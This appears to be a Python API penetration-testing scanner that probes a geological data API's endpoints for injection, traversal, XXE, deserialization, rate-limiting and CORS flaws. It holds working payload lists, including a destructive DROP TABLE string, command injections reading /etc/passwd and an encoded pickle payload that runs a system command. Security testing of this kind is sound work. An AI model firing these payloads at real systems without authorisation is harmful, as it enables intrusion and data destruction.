#!/usr/bin/env python3
"""
API Penetration Testing Module
Implements comprehensive API security testing including injection attacks
"""

import asyncio
import aiohttp
import time
import logging
from typing import Dict, List, Any

logger = logging.getLogger(__name__)

class APIPenetrationTester:
    """API penetration testing implementation"""
    
    def __init__(self, base_url: str):
        self.base_url = base_url
    
    async def test_sql_injection(self) -> Dict[str, Any]:
        """Test for SQL injection vulnerabilities"""
        logger.info("Testing SQL injection vulnerabilities...")
        
        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users --",
            "1' AND (SELECT COUNT(*) FROM users) > 0 --",
            "' OR 1=1#",
            "admin'--",
            "' OR 'x'='x",
            "1; WAITFOR DELAY '00:00:05' --"
        ]
        
        vulnerable_endpoints = []
        
        # Test common API endpoints
        test_endpoints = [
            '/api/v1/users',
            '/api/v1/volcanoes',
            '/api/v1/seismic-events',
            '/api/v1/geological-data'
        ]
        
        async with aiohttp.ClientSession() as session:
            for endpoint in test_endpoints:
                for payload in sql_payloads:
                    try:
                        # Test GET parameters
                        url = f"{self.base_url}{endpoint}?id={payload}"
                        async with session.get(url, timeout=10) as response:
                            if await self.detect_sql_injection_response(response):
                                vulnerable_endpoints.append({
                                    'endpoint': endpoint,
                                    'method': 'GET',
                                    'payload': payload,
                                    'parameter': 'id'
                                })
                        
                        # Test POST data
                        data = {'search': payload, 'filter': payload}
                        async with session.post(f"{self.base_url}{endpoint}", 
                                              json=data, timeout=10) as response:
                            if await self.detect_sql_injection_response(response):
                                vulnerable_endpoints.append({
                                    'endpoint': endpoint,
                                    'method': 'POST',
                                    'payload': payload,
                                    'parameter': 'body'
                                })
                                
                    except Exception as e:
                        logger.debug(f"SQL injection test error: {str(e)}")
                        
        return {
            'status': 'completed',
            'vulnerabilities_found': len(vulnerable_endpoints),
            'vulnerable_endpoints': vulnerable_endpoints,
            'risk_level': 'high' if vulnerable_endpoints else 'low'
        }
    
    async def detect_sql_injection_response(self, response: aiohttp.ClientResponse) -> bool:
        """Detect SQL injection vulnerability indicators in response"""
        try:
            text = await response.text()
            
            # Common SQL error patterns
            sql_errors = [
                'sql syntax',
                'mysql_fetch',
                'ora-01756',
                'microsoft ole db',
                'odbc sql server driver',
                'sqlite_master',
                'postgresql error',
                'warning: mysql'
            ]
            
            text_lower = text.lower()
            return any(error in text_lower for error in sql_errors)
            
        except Exception:
            return False
    
    async def test_nosql_injection(self) -> Dict[str, Any]:
        """Test for NoSQL injection vulnerabilities"""
        logger.info("Testing NoSQL injection vulnerabilities...")
        
        nosql_payloads = [
            {"$ne": None},
            {"$gt": ""},
            {"$where": "1==1"},
            {"$regex": ".*"},
            {"$exists": True},
            {"$or": [{"username": "admin"}, {"username": "test"}]}
        ]
        
        vulnerable_endpoints = []
        
        async with aiohttp.ClientSession() as session:
            for endpoint in ['/api/v1/users', '/api/v1/geological-data']:
                for payload in nosql_payloads:
                    try:
                        async with session.post(f"{self.base_url}{endpoint}",
                                              json=payload, timeout=10) as response:
                            if response.status == 200:
                                text = await response.text()
                                if len(text) > 1000:  # Unusually large response
                                    vulnerable_endpoints.append({
                                        'endpoint': endpoint,
                                        'payload': str(payload)
                                    })
                    except Exception:
                        pass
        
        return {
            'status': 'completed',
            'vulnerabilities_found': len(vulnerable_endpoints),
            'vulnerable_endpoints': vulnerable_endpoints
        }
    
    async def test_command_injection(self) -> Dict[str, Any]:
        """Test for command injection vulnerabilities"""
        logger.info("Testing command injection vulnerabilities...")
        
        command_payloads = [
            "; ls -la",
            "| whoami",
            "&& cat /etc/passwd",
            "`id`",
            "$(whoami)",
            "; ping -c 1 127.0.0.1",
            "| sleep 5"
        ]
        
        vulnerable_endpoints = []
        
        async with aiohttp.ClientSession() as session:
            for endpoint in ['/api/v1/process', '/api/v1/execute']:
                for payload in command_payloads:
                    try:
                        data = {'command': payload, 'filename': payload}
                        start_time = time.time()
                        
                        async with session.post(f"{self.base_url}{endpoint}",
                                              json=data, timeout=15) as response:
                            response_time = time.time() - start_time
                            
                            # Check for time-based injection (sleep command)
                            if 'sleep' in payload and response_time > 4:
                                vulnerable_endpoints.append({
                                    'endpoint': endpoint,
                                    'payload': payload,
                                    'evidence': f'Response time: {response_time}s'
                                })
                                
                    except Exception:
                        pass
        
        return {
            'status': 'completed',
            'vulnerabilities_found': len(vulnerable_endpoints),
            'vulnerable_endpoints': vulnerable_endpoints
        }
    
    async def test_path_traversal(self) -> Dict[str, Any]:
        """Test for path traversal vulnerabilities"""
        logger.info("Testing path traversal vulnerabilities...")
        
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd"
        ]
        
        vulnerable_endpoints = []
        
        async with aiohttp.ClientSession() as session:
            for endpoint in ['/api/v1/files', '/api/v1/download']:
                for payload in traversal_payloads:
                    try:
                        url = f"{self.base_url}{endpoint}?file={payload}"
                        async with session.get(url, timeout=10) as response:
                            text = await response.text()
                            
                            # Check for system file content
                            if ('root:' in text or 'localhost' in text or 
                                'Windows' in text):
                                vulnerable_endpoints.append({
                                    'endpoint': endpoint,
                                    'payload': payload,
                                    'evidence': 'System file content detected'
                                })
                                
                    except Exception:
                        pass
        
        return {
            'status': 'completed',
            'vulnerabilities_found': len(vulnerable_endpoints),
            'vulnerable_endpoints': vulnerable_endpoints
        }
    
    async def test_xxe_injection(self) -> Dict[str, Any]:
        """Test for XXE injection vulnerabilities"""
        logger.info("Testing XXE injection vulnerabilities...")
        
        xxe_payload = '''<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        <data>&xxe;</data>'''
        
        vulnerable_endpoints = []
        
        async with aiohttp.ClientSession() as session:
            for endpoint in ['/api/v1/upload', '/api/v1/import']:
                try:
                    headers = {'Content-Type': 'application/xml'}
                    async with session.post(f"{self.base_url}{endpoint}",
                                          data=xxe_payload, headers=headers,
                                          timeout=10) as response:
                        text = await response.text()
                        
                        if 'root:' in text:
                            vulnerable_endpoints.append({
                                'endpoint': endpoint,
                                'evidence': 'XXE file disclosure detected'
                            })
                            
                except Exception:
                    pass
        
        return {
            'status': 'completed',
            'vulnerabilities_found': len(vulnerable_endpoints),
            'vulnerable_endpoints': vulnerable_endpoints
        }
    
    async def test_deserialization_attacks(self) -> Dict[str, Any]:
        """Test for unsafe deserialization vulnerabilities"""
        logger.info("Testing deserialization vulnerabilities...")
        
        # Python pickle payload (base64 encoded)
        pickle_payload = "gASVKAAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwGX19pbXBvcnRfX5STlIwCb3OUhZRSlIwGc3lzdGVtlIwCaWSUhZRSlIaUUpQu"
        
        vulnerable_endpoints = []
        
        async with aiohttp.ClientSession() as session:
            for endpoint in ['/api/v1/deserialize', '/api/v1/load']:
                try:
                    data = {'serialized_data': pickle_payload}
                    async with session.post(f"{self.base_url}{endpoint}",
                                          json=data, timeout=10) as response:
                        if response.status == 500:
                            text = await response.text()
                            if 'pickle' in text.lower() or 'deserialize' in text.lower():
                                vulnerable_endpoints.append({
                                    'endpoint': endpoint,
                                    'evidence': 'Unsafe deserialization detected'
                                })
                                
                except Exception:
                    pass
        
        return {
            'status': 'completed',
            'vulnerabilities_found': len(vulnerable_endpoints),
            'vulnerable_endpoints': vulnerable_endpoints
        }
    
    async def test_rate_limiting(self) -> Dict[str, Any]:
        """Test rate limiting implementation"""
        logger.info("Testing rate limiting...")
        
        test_endpoint = f"{self.base_url}/api/v1/users"
        rate_limit_detected = False
        requests_sent = 0
        
        async with aiohttp.ClientSession() as session:
            # Send rapid requests
            for i in range(100):
                try:
                    async with session.get(test_endpoint, timeout=5) as response:
                        requests_sent += 1
                        
                        if response.status == 429:  # Too Many Requests
                            rate_limit_detected = True
                            break
                            
                except Exception:
                    break
        
        return {
            'status': 'completed',
            'rate_limit_detected': rate_limit_detected,
            'requests_sent': requests_sent,
            'recommendation': 'Implement rate limiting' if not rate_limit_detected else 'Rate limiting working'
        }
    
    async def test_cors_configuration(self) -> Dict[str, Any]:
        """Test CORS configuration"""
        logger.info("Testing CORS configuration...")
        
        test_origins = [
            'http://evil.com',
            'https://malicious.org',
            'null',
            '*'
        ]
        
        cors_issues = []
        
        async with aiohttp.ClientSession() as session:
            for origin in test_origins:
                try:
                    headers = {'Origin': origin}
                    async with session.options(f"{self.base_url}/api/v1/users",
                                             headers=headers, timeout=10) as response:
                        
                        cors_header = response.headers.get('Access-Control-Allow-Origin')
                        if cors_header == origin or cors_header == '*':
                            cors_issues.append({
                                'origin': origin,
                                'allowed': cors_header,
                                'risk': 'high' if origin in ['*', 'null'] else 'medium'
                            })
                            
                except Exception:
                    pass
        
        return {
            'status': 'completed',
            'cors_issues_found': len(cors_issues),
            'issues': cors_issues
        }